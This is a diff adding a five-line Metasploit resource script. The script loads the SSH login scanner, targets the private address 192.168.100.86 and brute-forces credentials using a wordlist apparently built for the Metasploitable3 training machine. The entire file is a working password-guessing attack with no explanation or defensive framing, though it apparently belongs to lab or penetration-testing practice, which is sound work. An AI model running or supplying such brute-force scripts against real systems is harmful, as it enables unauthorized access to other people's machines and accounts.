@@ -1,0 +1,5 @@
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.100.86
+set PASS_FILE /home/kali/wordlist-metasploitable3.txt
+set USER_FILE /home/kali/wordlist-metasploitable3.txt
+exploit
